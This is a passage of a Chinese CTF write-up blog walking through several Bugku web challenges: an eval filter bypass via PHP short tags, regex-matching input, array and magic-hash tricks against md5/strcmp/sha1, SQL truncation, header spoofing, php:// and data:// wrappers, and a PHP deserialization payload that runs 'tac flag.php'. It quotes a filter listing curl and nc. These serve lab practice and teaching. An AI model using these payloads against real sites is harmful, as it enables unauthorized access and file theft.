<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112142854892.png" alt="image-20221112142854892"></p>
<p>变量flag的长度要和变量exam的长度一致，是49</p>
<p><img src="https://img-blog.csdnimg.cn/f450399494b54f1884ae7915c2ac3713.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA55m95aGU5rKz5Yay5rWq5omL,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>过滤了flag,[]等一些关键字</p>
<p>审计PHP代码,</p>
<p>如果没有用get传参传入flag，则会显示Click here（正常，你看最前面那个Click here就知道了）</p>
<p><img src="https://img-blog.csdnimg.cn/3c00dd012f21485eb84709e25c2ae91f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6K-l55So5oi35q2j5pG46bG8,size_14,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>发现前面有<?php，尾巴没有后面肯定要用到" ?> ”给补全</p>
<p><img src="https://img-blog.csdnimg.cn/8ccbb1b23d694d3a84a90aa838c951bc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6K-l55So5oi35q2j5pG46bG8,size_12,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p> 要求strlen长度一样，长度要为len(return’7512158cb1d484b7a54f6c004b943687c4c66015’;)&#x3D;49</p>
<p> 还过滤了关键字</p>
<p><img src="https://img-blog.csdnimg.cn/34b913f95c1044d68ab8ba3b300ba018.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6K-l55So5oi35q2j5pG46bG8,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p> 下面存在eval()函数，我们可以通过构造php代码来绕过</p>
<? ?><p>和<?= ?>是短标签而<?php ?>是长标签，<br>其中<?= 是代替 <? echo的，<? ?> 代替的是<?php ?><br>按照这样来构造<?=$flag;?>，flag被过滤了,用$a构造一个flag字符串,然后echo$$a,[]也被过滤了</p>
<p>3：然后构造得</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?flag=$a=&#x27;fla9&#x27;;$a&#123;3&#125;=&#x27;g&#x27;;?&gt;&lt;?=$$a;?&gt;111111111111111111</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用&#x27;&#x27;是因为&quot;&quot;被过滤了</span><br><span class="line">从flag=后面开始数，长度刚好要等于49,111~就是为了凑</span><br><span class="line">flag被过滤了，所以fla9，再把9用g替换</span><br><span class="line">弄完一个记得分号;</span><br><span class="line"> %27编码后就是&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112145005647.png" alt="image-20221112145005647"></p>
<h2 id="48-字符？正则"><a href="#48-字符？正则" class="headerlink" title="48.字符？正则"></a>48.字符？正则</h2><p>打开<img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112152743815.png" alt="image-20221112152743815"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">preg_match：执行匹配正则表达式</span><br><span class="line"></span><br><span class="line">preg_match(pattern,subject，matches)</span><br><span class="line"></span><br><span class="line">pattern指的是要搜索的模式，subject指的是输入字符串，matches可选，存储匹配结果的数组， $matches[0] 将包含与整个模式匹配的文本，$matches[1] 将包含与第一个捕获的括号中的子模式所匹配的文本，以此类推</span><br><span class="line"></span><br><span class="line">trim() 函数移除字符串两侧的空白字符或其他预定义字符</span><br><span class="line"> . 是匹配除换行符以外的任意单个字符</span><br><span class="line"></span><br><span class="line">*是匹配位于“*”之前的字符或子模式的0次或多次出现</span><br><span class="line"></span><br><span class="line">所以可以构造keykey</span><br><span class="line"></span><br><span class="line"> &#123;4,7&#125;是按最少四次最多七次来进行匹配，也就是匹配长度为5~8的字符串</span><br><span class="line"></span><br><span class="line">所以构造keykey*****（或别的只要达到要求）</span><br><span class="line"></span><br><span class="line"> \表示位于\之后的为转义字符</span><br><span class="line"></span><br><span class="line">所以构造key:/a/（或别的，例如key:/5/）</span><br><span class="line"></span><br><span class="line">[a-z]字符范围，匹配指定范围内的任何字符</span><br><span class="line"></span><br><span class="line">所以构造keya</span><br><span class="line"></span><br><span class="line">[:punct:]表示任意标点符号</span><br><span class="line"></span><br><span class="line">/i代表大小写不敏感</span><br><span class="line"></span><br><span class="line">所以可以构造</span><br><span class="line">?id=keykey11111key:/5/keya=</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112170211644.png" alt="image-20221112170211644"></p>
<h2 id="49-前女友"><a href="#49-前女友" class="headerlink" title="49.前女友"></a>49.前女友</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112184102931.png" alt="image-20221112184102931"></p>
<p>点击链接</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112184117262.png" alt="image-20221112184117262"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">strcmp()函数：</span><br><span class="line"></span><br><span class="line">这个函数是用于比较字符串的函数</span><br><span class="line"></span><br><span class="line">strcmp ( string $str1 , string $str2 )</span><br><span class="line"></span><br><span class="line">参数 str1第一个字符串。str2第二个字符串。</span><br><span class="line"></span><br><span class="line">如果 str1 小于 str2 返回 &lt; 0；</span><br><span class="line"></span><br><span class="line">如果 str1 大于 str2 返回 &gt; 0；</span><br><span class="line"></span><br><span class="line">如果两者相等，返回 0。</span><br></pre></td></tr></table></figure>

<p>在PHP中</p>
<p>MD5是不能处理数组的，md5(数组)会返回null</p>
<p>所以即</p>
<p>md5(a[]) &#x3D; &#x3D;null,  md5(b[]) &#x3D; &#x3D;null，md5(a[])&#x3D;md5(b[])&#x3D;null也可以满足代码中的条件</p>
<p>构造： index.php?v1[]&#x3D;1&amp;v2[]&#x3D;2&amp;v3[]&#x3D;3</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112184725302.png" alt="image-20221112184725302"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">strcmp()函数不能比较数组</span><br></pre></td></tr></table></figure>



<h2 id="50-login1"><a href="#50-login1" class="headerlink" title="50.login1"></a>50.login1</h2><p>题目提示SQL约束攻击</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112185159867.png" alt="image-20221112185159867"></p>
<p>SQL语句中的空格作为字符的结尾时，空格符会被修剪，也就是说’vampire’与’vampire  ‘ 没有什么区别</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;vampire     &#x27;</span>;</span><br><span class="line">对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，<span class="keyword">SQL</span>会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</span><br><span class="line">在所有的<span class="keyword">INSERT</span>插入时，<span class="keyword">SQL</span>都会根据<span class="type">varchar</span>(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“<span class="number">5</span>”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前<span class="number">5</span>个字符，即“vampi”。</span><br></pre></td></tr></table></figure>

<p>注册账户admin</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112191351941.png" alt="image-20221112191351941"></p>
<p>我们并不知道数据库中定义的用户名的类型varchar(n)中n的具体数目，所以将空格尽可能的敲长一些，然后输入密码注册账号。</p>
<p>登录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112191434536.png" alt="image-20221112191434536"></p>
<h2 id="51-你从哪里来"><a href="#51-你从哪里来" class="headerlink" title="51.你从哪里来"></a>51.你从哪里来</h2><p>referer:修改数据包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112192325374.png" alt="image-20221112192325374"></p>
<p>在数据包中添加Referer，可以让对方判断你是从哪里开的</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112192424402.png" alt="image-20221112192424402"></p>
<h2 id="52-MD5"><a href="#52-MD5" class="headerlink" title="52.MD5"></a>52.MD5</h2><p>题目提示：MD5碰撞</p>
<p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112192915470.png" alt="image-20221112192915470"></p>
<p>传参a</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112193207232.png" alt="image-20221112193207232"></p>
<p>要MD5加密</p>
<p>加密有多种</p>
<p>源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$md51</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$md52</span> = @<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="variable">$md51</span> == <span class="variable">$md52</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nctf&#123;*****************&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!!!&quot;</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;please input a&quot;</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>含义是GET传递a参数，网页读取参数值进行MD5加密，再将已知确定的明星字符串<code>&#39;QNKCDZO&#39;</code>进行md5加密，将两原字符串比较确定a的原参数字符串不是<code>&#39;QNKCDZO&#39;</code>的同时两字符串的加密结果是相等的。</p>
<p>这看起来是矛盾的但是php弱相等中有以“0E”开头的字符串默认都为0,都相等。</p>
<p>已知<code>&#39;QNKCDZO&#39;</code>的加密字符串确为0E开头，则只需要传递的a的参数也是0E开头的</p>
<p>常见的加密之后以0E开头的原字符串和加密字符串如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<p>所以payload设置成<code>http://123.206.87.240:9009/md5.php?a=s878926199a</code>即可</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112202917441.png" alt="image-20221112202917441"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">什么是MD5碰撞：</span><br><span class="line">散列值（MD5加密后的值）的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以对于一个散列值可以找到多个输入使得它们的散列值相同。</span><br><span class="line">一个安全的摘要算法在设计时必须满足两个要求：其一是寻找两个输入得到相同的输出值在计算上是不可行的，这就是我们通常所说的抗碰撞的；其二是找一个输出，能得到给定的输入在计算上是不可行的，即不可从结果推导出它的初始状态。</span><br><span class="line"></span><br><span class="line">“md5碰撞”，即对一个确定的md5值，找到一个输入，使得计算出的MD5值和之前确定的md5值一样。</span><br><span class="line">md5碰撞简而言之就是：先得出一个字符串的MD5值，再根据这个值，逆算出另外一个不同的字符串——但是它们的MD5值是一致的。</span><br><span class="line"></span><br><span class="line">PHP弱比较: 0aaaaaa=0bbbbbb</span><br></pre></td></tr></table></figure>







<h2 id="53-程序员本地网站"><a href="#53-程序员本地网站" class="headerlink" title="53.程序员本地网站"></a>53.程序员本地网站</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112203344331.png" alt="image-20221112203344331"></p>
<p>burpsuite抓包，修改为本地登录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112203449725.png" alt="image-20221112203449725"></p>
<p>得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112203318734.png" alt="image-20221112203318734"></p>
<h2 id="54-各种绕过哦"><a href="#54-各种绕过哦" class="headerlink" title="54.各种绕过哦"></a>54.各种绕过哦</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221112203654452.png" alt="image-20221112203654452"></p>
<p>代码梳理</p>
<ol>
<li>id、uname通过get方法传值，passwd通过post方法传值且如果想要进入内层循环必须传入uname和passwd</li>
<li>uname和passwd弱类型不相等</li>
<li>uname和passwd加密后的值强相等</li>
<li>id字段url解码后&#x3D;‘margin’</li>
</ol>
<p><strong>不等数组加密后相等：sha1()函数存在弱类型和无法处理数组的漏洞，如果传的是个数组，sha1()函数会报错，并返回NULL</strong></p>
<p>构造payload：</p>
<p><img src="https://img-blog.csdnimg.cn/5b8cfbbea59d4d2ab808671abe0752dd.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Yav5Yav5Yavfg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h2 id="55-file-get-contents"><a href="#55-file-get-contents" class="headerlink" title="55.file_get_contents"></a>55.file_get_contents</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113100655651.png" alt="image-20221113100655651"></p>
<p>empty() 函数用于检查一个变量是否为空。empty() 判断一个变量是否被认为是空的。当一个变量并不存在，或者它的值等同于 FALSE，那么它会被认为不存在。如果变量不存在的话，empty()并不会产生警告。</p>
<p>extract()函数从数组里将变量导入到当前的符号表。extract函数：可以进行变量覆盖</p>
<p>file_get_contents()把整个文件读入一个字符串里。</p>
<p>trim()函数移除字符串两侧的空白字符或其他预定义字符。</p>
<p>经过分析，该段代码是将通过GET方法传入的参数赋值给其内某个变量，传入的参数如果和$fn文件里的字符一致时，便可以得到flag</p>
<p>这道题目的考点是file_get_contents()函数绕过</p>
<p>绕过方法：<br>使用php:&#x2F;&#x2F;input伪协议绕过<br>1、将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input<br>用post方法传入想要file_get_contents()函数返回的值<br>2、用data:&#x2F;&#x2F;伪协议绕过<br>将url改为：?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码<br>或者将url改为：?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)<br>本题适用的方法是第一类，因为还有个参数ac需要传递</p>
<p>方法一：</p>
<p>源码里有file_get_contents($fn),加上提示：txt???，盲猜flag.txt，访问一下</p>
<p><img src="https://img-blog.csdnimg.cn/397309852d684f63ba6c9256b68cfb0c.png" alt="在这里插入图片描述"></p>
<p>内容为bugku，<br>根据if($ac &#x3D;&#x3D;&#x3D; $f),构造?fn&#x3D;flag.txt,&amp;ac&#x3D;bugku，最后得到flag<br>因为先访问flag.txt，得到内容bugku，文件名赋给fn，f就是文件内容，这样f和ac就相等。</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113103131512.png" alt="image-20221113103131512"></p>
<p>方法二：</p>
<p>burp抓包，利用PHP伪协议</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113103221580.png" alt="image-20221113103221580"></p>
<h2 id="56-安慰奖"><a href="#56-安慰奖" class="headerlink" title="56.安慰奖"></a>56.安慰奖</h2><p>打开，啥也没有，查看源代码，有base64编码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113103642717.png" alt="image-20221113103642717"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113103724575.png" alt="image-20221113103724575"></p>
<p>解密后是backups单词，这个意思是备份，可以猜测是跟index.php.bak文件有关,下载下来备份文件后，获得后台代码，开始代码审计。</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113103855596.png" alt="image-20221113103855596"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113103909997.png" alt="image-20221113103909997"></p>
<p>通过这里的代码，可以知道，这里考的是php序列化，和反序列化的一些知识，还有linux命令的考察。</p>
<p>序列化的常见魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct() 创建对象时调用</span><br><span class="line">__destruct() 销毁对象时调用</span><br><span class="line">__toString() 当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup 将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>

<p>开始审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$username</span> = <span class="string">&#x27;hack&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cmd</span> = <span class="string">&#x27;NULL&#x27;</span>;</span><br><span class="line">    定义username和cmd变量</span><br><span class="line">----------------------------------------------</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    构造方法</span><br><span class="line">----------------------------------------------</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">此处是将username的值改为guest</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|more|tail|less|head|curl|nc|strings|sort|echo/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&#x27;&lt;/br&gt;flag能让你这么容易拿到吗？&lt;br&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       一堆正则</span><br><span class="line">----------------------------------------------</span><br><span class="line"> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// echo &quot;&lt;br&gt;right!&lt;br&gt;&quot;;</span></span><br><span class="line">            <span class="variable">$a</span> = `<span class="variable language_">$this</span>-&gt;cmd`;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"> 如果username的值为admin将cmd的值传给a变量并输出执行</span><br><span class="line">----------------------------------------------</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line">  get获取code的值传给select并把select的值反序列化后传给res</span><br></pre></td></tr></table></figure>

<p>所以唯一可以传的是code的值 所以用code里面包含username和cmd即可传值给他们</p>
<p>因为类名是ctf，所以构造为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=0:3:&quot;ctf&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>绕过wakeup函数就在第一个2改为3即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=O:3:&quot;ctf&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>但是要注意上面的写错了，因为定义的是protected，在php序列化的时候private和 protected 变量会引入不可见字符%00，所以username和cmd前面要加或%00*%00(这里算三个字符)</p>
<p>所以正确的应该是这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code=O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:2:&quot;ls&quot;;&#125;</span><br><span class="line">这里传了个ls命令</span><br><span class="line">而cmd的传值中cat,tac,more,less,head都被过滤了， 但是在研究后发现tac命令没有过滤，所以可以用tac命令查看文件</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113105823335.png" alt="image-20221113105823335"></p>
<p>所以直接用tac命令后修改为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=O:3:&quot;ctf&quot;:3:&#123;s:11:&quot;%00*%00username&quot;;s:5:&quot;admin&quot;;s:6:&quot;%00*%00cmd&quot;;s:12:&quot;tac flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113105846504.png" alt="image-20221113105846504"></p>
<h2 id="57-文件上传"><a href="#57-文件上传" class="headerlink" title="57.文件上传"></a>57.文件上传</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221113134057105.png" alt="image-20221113134057105"></p>
<p>先传一个php试一下</p>
<p><img src="https://img-blog.csdnimg.cn/20210616092236647.png" alt="在这里插入图片描述"></p>
